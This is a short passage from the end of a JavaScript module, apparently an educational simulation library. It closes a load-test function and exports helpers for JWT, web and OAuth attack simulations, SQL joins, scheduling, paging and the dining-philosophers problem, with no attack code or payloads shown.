    return { series: out, found: [...found], peakErr, worstP99, restarts, breakAt, minutes: S.minutes, pass: peakErr < 0.01 && worstP99 < 500 };
  }

  const api = { rng, JWT_ATTACKS, jwtVerify, jwtSafe, WEB_DEFENCES, WEB_ATTACKS, webAttack, webBoard, OAUTH_FLOWS, OAUTH_ATTACKS, oauth, oauthSafe,
    USERS, ORDERS, sqlJoin, sameRows, SALES, sqlWindow, SCHED_LOADS, schedule, REF_STRINGS, paging, faultCurve, philosophers, philosopherTrials, TEST_SHAPES, loadTest };
  if (typeof module !== 'undefined' && module.exports) module.exports = api;
  else root.CoreModels = api;
})(typeof window !== 'undefined' ? window : globalThis);
